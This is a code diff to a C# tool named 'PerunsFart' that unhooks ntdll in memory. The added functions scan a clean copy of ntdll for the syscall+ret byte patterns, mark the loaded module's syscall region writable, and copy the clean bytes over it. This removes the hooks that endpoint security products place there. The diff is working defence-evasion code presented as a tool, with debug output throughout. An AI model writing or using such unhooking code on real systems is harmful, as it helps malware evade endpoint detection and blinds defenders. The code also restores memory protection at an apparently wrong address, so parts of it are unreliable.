@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
@@ -68,12 +69,15 @@ namespace PerunsFart
             if(cache != null)
             {
                 Debug("\nUnhooking NTDLL");
-                UnhookDLL(cache);
+                UnhookDLL(cache, GetModuleBaseAddress("ntdll"));
                 Debug("[+] Done");
             }
+
+            Console.WriteLine("Press a key to end...");
+            Console.ReadLine();
         }
 
-        static bool UnhookDLL(byte[] cleanModule)
+        static bool UnhookDLL(byte[] cleanModule, IntPtr dirtyModuleBaseAddress)
         {
             // find the .text section of the cache
             unsafe
@@ -121,12 +125,103 @@ namespace PerunsFart
                         Debug("[+] Next section is at 0x{0}", new string[] { pCurrentSection.ToString("X") });
                         secHdr = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrentSection, typeof(IMAGE_SECTION_HEADER));
                     }
+
+                    // here we locate the frist and last syscall in the module - these are the hooked bytes we want to overwrite with our clean module
+                    // find the first syscall offset
+                    int startOffset = FindFirstSyscallOffset(cleanModule, (Int32)secHdr.VirtualSize, dirtyModuleBaseAddress);
+
+                    // find the last syscall offset
+                    int endOffset = FindLastSyscallOffset(cleanModule, (Int32)secHdr.VirtualSize, dirtyModuleBaseAddress);
+
+                    // get the syscall bytes from the clean module
+                    byte[] cleanSyscalls = new byte[endOffset - startOffset];
+                    Buffer.BlockCopy(cleanModule, startOffset, cleanSyscalls, 0, endOffset - startOffset);
+
+                    // change the original dll page to writable
+                    Debug("[+] VirtualProtect Dll to PAGE_EXECUTE_READWRITE...");
+                    bool result = VirtualProtect(IntPtr.Add(dirtyModuleBaseAddress, startOffset), (UIntPtr)cleanSyscalls.Length, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out UInt32 lpflOldProtect);
+
+                    // TODO: copy over the hooked ntdll
+                    Debug("[+] Unhooking Dll by copying clean data...");
+                    try
+                    {
+                        Marshal.Copy(cleanSyscalls, 0, IntPtr.Add(dirtyModuleBaseAddress, startOffset), cleanSyscalls.Length);
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug("[!] Unable to copy mapped data! {0}", new string[] { ex.Message });
+                        return false;
+                    }
+
+                    // reset memory protection
+                    Debug("[+] VirtualProtect Dll to OldProtect");
+                    result = VirtualProtect(IntPtr.Add(dirtyModuleBaseAddress, (Int32)secHdr.VirtualSize), (UIntPtr)secHdr.VirtualSize, lpflOldProtect, out  lpflOldProtect);
                 }
             }
 
             return true;
         }
         
+        static int FindFirstSyscallOffset(byte[] pMem, int size, IntPtr moduleAddress)
+        {
+            int offset = 0;
+            byte[] pattern1 = new byte[] { 0x0f, 0x05, 0xc3 };
+            byte[] pattern2 = new byte[] { 0xcc, 0xcc, 0xcc };
+
+            // find first occurance of syscall+ret instructions
+            for(int i=0; i < size - 3; i++)
+            {
+                byte[] instructions = new byte[3] { pMem[i], pMem[i + 1], pMem[i + 2] };
+
+                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern1))
+                {
+                    offset = i;
+                    break;
+                }
+            }
+
+            // find the beginning of the syscall
+            for(int i = 3; i < 50; i++)
+            {
+                byte[] instructions = new byte[3] { pMem[offset - i], pMem[offset - i + 1], pMem[offset - i + 2] };
+
+                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern2))
+                { 
+                    offset = offset - i + 3;
+                    break;
+                }
+            }
+
+            IntPtr addr = IntPtr.Add(moduleAddress, offset);
+
+            Debug("[+] First syscall found at offset: 0x{0}, addr: 0x{1}", new string[] { offset.ToString("X"), addr.ToString("X") });
+
+            return offset;
+        }
+
+        static int FindLastSyscallOffset(byte[] pMem, int size, IntPtr moduleAddress)
+        {
+            int offset = 0;
+            byte[] pattern = new byte[] { 0x0f, 0x05, 0xc3, 0xcd, 0x2e, 0xc3, 0xcc, 0xcc, 0xcc };
+
+            for(int i = size - 9; i > 0; i--)
+            {
+                byte[] instructions = new byte[9] { pMem[i], pMem[i + 1], pMem[i + 2], pMem[i + 3], pMem[i + 4], pMem[i + 5], pMem[i + 6], pMem[i + 7], pMem[i + 8] };
+
+                if (StructuralComparisons.StructuralEqualityComparer.Equals(instructions, pattern))
+                {
+                    offset = i + 6;
+                    break;
+                }
+            }
+
+            IntPtr addr = IntPtr.Add(moduleAddress, offset);
+
+            Debug("[+] Last syscall found at offset: 0x{0}, addr: 0x{1}", new string[] { offset.ToString("X"), addr.ToString("X") }) ;
+
+            return offset;
+        }
+
         static uint GetModuleSize(string module)
         {
             Debug("[+] Getting Module Size: {0}", new string[] { module });
